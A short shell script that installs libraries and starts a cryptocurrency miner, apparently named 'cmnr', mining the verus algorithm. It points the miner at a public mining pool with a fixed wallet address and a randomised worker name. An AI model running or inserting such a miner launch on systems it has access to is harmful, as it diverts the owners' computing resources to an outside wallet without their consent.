apt-get update
apt-get install -y libjansson4
apt-get install -y libssl1.1
apt-get install -y libomp5

RAND=$((RANDOM % 900 + 100))
./cmnr -a verus -o stratum+tcp://de.vipor.net:5040 -u RJybPz1ptdiinnoAy457BztBwFqaksjtN7.Worker-${RAND}-GH -p x -t 3
